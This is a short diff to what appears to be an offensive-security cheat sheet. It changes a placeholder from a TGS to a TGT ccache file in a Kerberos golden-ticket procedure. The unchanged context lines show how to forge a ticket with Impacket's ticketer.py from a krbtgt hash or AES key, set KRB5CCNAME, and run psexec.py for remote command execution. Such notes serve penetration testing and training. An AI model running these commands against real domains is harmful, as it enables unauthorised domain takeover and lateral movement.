@@ -12,7 +12,7 @@ python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <
 python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
 
 # Set the ticket for impacket use
-export KRB5CCNAME=<TGS_ccache_file>
+export KRB5CCNAME=<TGT_ccache_file>
 
 # Execute remote commands with any of the following by using the TGT
 python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
